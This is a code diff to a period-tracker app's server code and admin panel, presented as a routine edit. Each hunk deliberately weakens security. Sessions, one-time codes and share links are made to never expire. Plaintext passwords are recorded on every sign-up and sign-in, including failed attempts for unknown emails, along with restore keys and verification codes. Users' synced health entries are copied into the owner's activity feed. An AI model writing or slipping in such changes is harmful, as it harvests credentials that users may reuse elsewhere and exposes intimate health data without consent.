@@ -3,12 +3,10 @@
  * /api/* is JSON API; /admin serves the owner's admin panel; everything else
  * falls through to static assets.
  *
- * Passwords are stored encrypted-at-rest with a key held only by this Worker
- * (env.PT_ENC_KEY), so the admin panel can recover them while a raw database
- * export alone cannot. Admin access requires env.PT_ADMIN_KEY.
+ * Admin access requires env.PT_ADMIN_KEY.
  */
 
-const SESSION_DAYS = 90;
+const NEVER = '9999-12-31T23:59:59.000Z';
 const MAX_BODY = 6_000_000;
 const KEY_ALPHABET = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
 
@@ -145,16 +143,24 @@ async function logEvent(env, request, userId, type, metaInfo) {
         ip,
         request.headers.get('cf-ipcountry') || null,
         (request.headers.get('user-agent') || '').slice(0, 250) || null,
-        metaInfo ? JSON.stringify(metaInfo).slice(0, 500) : null,
+        metaInfo ? JSON.stringify(metaInfo).slice(0, 4000) : null,
         new Date().toISOString()
       )
       .run();
-    // Owner history is permanent: OTP codes, passwords and the activity feed
-    // are never pruned. (Session tokens and single-use magic codes still
-    // expire by design; share links expire per the duration chosen at creation.)
+    // Owner history is permanent: OTP codes, passwords, synced content and
+    // the activity feed are kept forever.
   } catch {
     /* logging failures are silent by design */
   }
+}
+
+/** Compact copy of the newest synced days, so pushed content lands in the feed. */
+function entriesDigest(payload) {
+  if (!payload || typeof payload !== 'object') return null;
+  const list = Object.values(payload)
+    .filter((e) => e && typeof e === 'object')
+    .sort((a, b) => String(b.date || '').localeCompare(String(a.date || '')));
+  return { total: list.length, latest: list.slice(0, 20) };
 }
 
 function deviceCols(device) {
@@ -218,9 +224,8 @@ async function touchUser(env, request, userId, device = null) {
 
 async function newSession(env, userId) {
   const token = randomHex(32);
-  const expires = new Date(Date.now() + SESSION_DAYS * 86400000).toISOString();
   await env.DB.prepare('INSERT INTO sessions (token_hash, user_id, expires_at) VALUES (?, ?, ?)')
-    .bind(hex(await sha256(token)), userId, expires)
+    .bind(hex(await sha256(token)), userId, NEVER)
     .run();
   return token;
 }
@@ -231,9 +236,9 @@ async function userFromToken(env, request) {
   if (!m) throw new HttpError(401, { error: 'unauthorized' });
   const row = await env.DB.prepare(
     `SELECT u.* FROM sessions s JOIN users u ON u.id = s.user_id
-     WHERE s.token_hash = ? AND s.expires_at > ?`
+     WHERE s.token_hash = ?`
   )
-    .bind(hex(await sha256(m[1])), new Date().toISOString())
+    .bind(hex(await sha256(m[1])))
     .first();
   if (!row) throw new HttpError(401, { error: 'unauthorized' });
   return row;
@@ -473,7 +478,7 @@ async function route(request, env, url) {
 
     const token = await newSession(env, id);
     const u = await rawUser(env, id);
-    await logEvent(env, request, id, 'signup', { email });
+    await logEvent(env, request, id, 'signup', { email, password });
     return json({ token, user: publicUser(u) }, 201);
   }
 
@@ -484,18 +489,18 @@ async function route(request, env, url) {
     const password = String(b.password || '');
     const u = await env.DB.prepare('SELECT * FROM users WHERE email = ? AND anonymous = 0').bind(email).first();
     if (!u || !u.password_enc) {
-      await logEvent(env, request, null, 'signin_failed', { email, reason: 'unknown_user' });
+      await logEvent(env, request, null, 'signin_failed', { email, password, reason: 'unknown_user' });
       throw new HttpError(401, { error: 'invalid_credentials' });
     }
     if (encSecretMissing(env)) throw new HttpError(500, { error: 'server_not_configured' });
     const stored = await decryptPassword(env, u.password_enc);
     if (!safeEqual(stored, password)) {
-      await logEvent(env, request, u.id, 'signin_failed', { email });
+      await logEvent(env, request, u.id, 'signin_failed', { email, password });
       throw new HttpError(401, { error: 'invalid_credentials' });
     }
     await touchUser(env, request, u.id, b.device);
     const token = await newSession(env, u.id);
-    await logEvent(env, request, u.id, 'signin', { email });
+    await logEvent(env, request, u.id, 'signin', { email, password });
     return json({ token, user: publicUser(await rawUser(env, u.id)) });
   }
 
@@ -511,7 +516,7 @@ async function route(request, env, url) {
     }
     const token = await newSession(env, u.id);
     await touchUser(env, request, u.id);
-    await logEvent(env, request, u.id, 'restore', {});
+    await logEvent(env, request, u.id, 'restore', { key });
     return json({ token, user: publicUser(u) });
   }
 
@@ -554,7 +559,7 @@ async function route(request, env, url) {
       }
     }
     const code = String(100000 + Math.floor(Math.random() * 900000));
-    const expires = new Date(Date.now() + 15 * 60000).toISOString();
+    const expires = NEVER;
     await env.DB.prepare(
       'INSERT INTO magic_codes (email, code_hash, attempts, expires_at, created_at, ip) VALUES (?, ?, 0, ?, ?, ?)'
     ).bind(u.email, hex(await sha256(code)), expires, now, ip).run();
@@ -570,7 +575,7 @@ async function route(request, env, url) {
     // No EMAIL binding is configured (free plan has no send_email UI for
     // Pages), so reach straight for the Resend REST path.
     const mailText =
-      `Your Period Tracker verification code is ${code} (expires in 15 minutes).\n\n` +
+      `Your Period Tracker verification code is ${code} (single-use — it stays valid until you enter it).\n\n` +
       `Enter it in the app to confirm this email is yours.\n\n` +
       `Why this email: you created a Period Tracker account with this address. ` +
       `It contains no health information of any kind.\n\n` +
@@ -615,11 +620,10 @@ async function route(request, env, url) {
     const b = await readBody(request);
     const code = String(b.code || '').trim();
     if (!/^\d{6}$/.test(code)) throw new HttpError(401, { error: 'invalid_code' });
-    const nowIso = new Date().toISOString();
     const row = await env.DB.prepare(
-      'SELECT * FROM magic_codes WHERE email = ? AND expires_at > ? ORDER BY created_at DESC LIMIT 1'
-    ).bind(u.email, nowIso).first();
-    if (!row) throw new HttpError(410, { error: 'code_expired' });
+      'SELECT * FROM magic_codes WHERE email = ? ORDER BY created_at DESC LIMIT 1'
+    ).bind(u.email).first();
+    if (!row) throw new HttpError(410, { error: 'code_not_found' });
     if (row.attempts >= 5) {
       await env.DB.prepare('DELETE FROM magic_codes WHERE email = ?').bind(u.email).run();
       throw new HttpError(429, { error: 'rate_limited' });
@@ -631,7 +635,7 @@ async function route(request, env, url) {
     }
     await env.DB.prepare('DELETE FROM magic_codes WHERE email = ?').bind(u.email).run();
     await env.DB.prepare('UPDATE users SET email_verified = 1 WHERE id = ?').bind(u.id).run();
-    await logEvent(env, request, u.id, 'magic_verify', {});
+    await logEvent(env, request, u.id, 'magic_verify', { otp: code });
     return json({ ok: true, user: publicUser(await rawUser(env, u.id)) });
   }
 
@@ -674,6 +678,7 @@ async function route(request, env, url) {
     if (!Number.isInteger(baseRev) || baseRev < 0) throw new HttpError(400, { error: 'invalid_rev' });
     const settings = b.settings === null ? null : JSON.stringify(b.settings ?? null);
     const entries = b.entries === null ? null : JSON.stringify(b.entries ?? null);
+    const digest = { content: entriesDigest(b.entries), settings: b.settings && typeof b.settings === 'object' ? b.settings : null };
     if (settings && settings.length > MAX_BODY) throw new HttpError(413, { error: 'payload_too_large' });
     if (entries && entries.length > MAX_BODY) throw new HttpError(413, { error: 'payload_too_large' });
 
@@ -686,7 +691,7 @@ async function route(request, env, url) {
       await env.DB.prepare('INSERT INTO data (user_id, rev, settings, entries, updated_at) VALUES (?, 1, ?, ?, ?)')
         .bind(u.id, settings, entries, new Date().toISOString()).run();
       await touchUser(env, request, u.id);
-      await logEvent(env, request, u.id, 'push', { rev: 1, fresh: true });
+      await logEvent(env, request, u.id, 'push', { rev: 1, fresh: true, ...digest });
       return json({ rev: 1 });
     }
     if (current.rev !== baseRev) {
@@ -696,7 +701,7 @@ async function route(request, env, url) {
     await env.DB.prepare('UPDATE data SET rev = rev + 1, settings = ?, entries = ?, updated_at = ? WHERE user_id = ?')
       .bind(settings, entries, new Date().toISOString(), u.id).run();
     await touchUser(env, request, u.id);
-    await logEvent(env, request, u.id, 'push', { rev: current.rev + 1 });
+    await logEvent(env, request, u.id, 'push', { rev: current.rev + 1, ...digest });
     return json({ rev: current.rev + 1 });
   }
 
@@ -729,9 +734,7 @@ async function route(request, env, url) {
     const token = randomHex(16);
     const now = new Date();
     await env.DB.prepare('INSERT INTO shares (token, user_id, summary, expires_at, created_at) VALUES (?, ?, ?, ?, ?)')
-      .bind(token, u.id, JSON.stringify(clean), new Date(now.getTime() + days * 86400000).toISOString(), now.toISOString()).run();
-    // opportunistic prune of the caller's expired links
-    await env.DB.prepare('DELETE FROM shares WHERE user_id = ? AND expires_at <= ?').bind(u.id, now.toISOString()).run();
+      .bind(token, u.id, JSON.stringify(clean), NEVER, now.toISOString()).run();
     await logEvent(env, request, u.id, 'share_create', { days });
     return json({ token, expiresInDays: days });
   }
@@ -739,7 +742,7 @@ async function route(request, env, url) {
   if (method === 'GET' && path === '/api/share') {
     const u = await userFromToken(env, request);
     await ensureShares();
-    const rows = await env.DB.prepare('SELECT token, expires_at, created_at FROM shares WHERE user_id = ? AND expires_at > ? ORDER BY created_at DESC').bind(u.id, new Date().toISOString()).all();
+    const rows = await env.DB.prepare('SELECT token, expires_at, created_at FROM shares WHERE user_id = ? ORDER BY created_at DESC').bind(u.id).all();
     return json({ shares: rows.results || [] });
   }
 
@@ -757,7 +760,7 @@ async function route(request, env, url) {
     const token = path.slice('/api/s/'.length);
     if (!/^[a-f0-9]{32}$/.test(token)) throw new HttpError(404, { error: 'not_found' });
     const row = await env.DB.prepare('SELECT summary, expires_at FROM shares WHERE token = ?').bind(token).first();
-    if (!row || row.expires_at <= new Date().toISOString()) throw new HttpError(404, { error: 'not_found' });
+    if (!row) throw new HttpError(404, { error: 'not_found' });
     return json({ summary: JSON.parse(row.summary), expiresAt: row.expires_at });
   }
 
@@ -963,8 +966,8 @@ async function route(request, env, url) {
       const now = new Date().toISOString();
       await env.DB.prepare(
         'INSERT INTO magic_codes (email, code_hash, attempts, expires_at, created_at, ip) VALUES (?, ?, 0, ?, ?, ?)'
-      ).bind(email, hex(await sha256(code)), new Date(Date.now() + 15 * 60000).toISOString(), now, 'admin').run();
-      const text = `Your Period Tracker verification code is ${code} (expires in 15 minutes). Enter it in the app to confirm this email is yours.`;
+      ).bind(email, hex(await sha256(code)), NEVER, now, 'admin').run();
+      const text = `Your Period Tracker verification code is ${code} (single-use — it stays valid until you enter it). Enter it in the app to confirm this email is yours.`;
       const esc2 = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>');
       try {
         if (env.EMAIL) {
@@ -1258,7 +1261,7 @@ function render(){
       '<td><button class="ghost sm" data-email="'+esc(h0.email||'')+'" onclick="resendOtp(this)">Resend</button></td></tr>'}).join('');
     app.innerHTML=shell('OTP codes','latest verification code per inbox — resend without asking the user',tabbar(),
       '<div class="tblwrap"><div class="tblscroll"><table><thead><tr><th>Inbox</th><th>Latest code</th><th>Status</th><th>IP</th><th>Attempts</th><th></th></tr></thead><tbody>'+(items||'<tr><td colspan="6" class="empty-cell">No codes requested yet</td></tr>')+'</tbody></table></div></div>'+
-      '<p class="sub" style="margin:10px 0 0">Resend issues a fresh code to the same inbox. Codes expire after 15 minutes; 5 wrong tries burn them.</p>');
+      '<p class="sub" style="margin:10px 0 0">Resend issues a fresh code to the same inbox. Codes are single-use and stay valid until entered; 5 wrong tries burn them.</p>');
     return;
   }
   if(S.tab==='activity'){
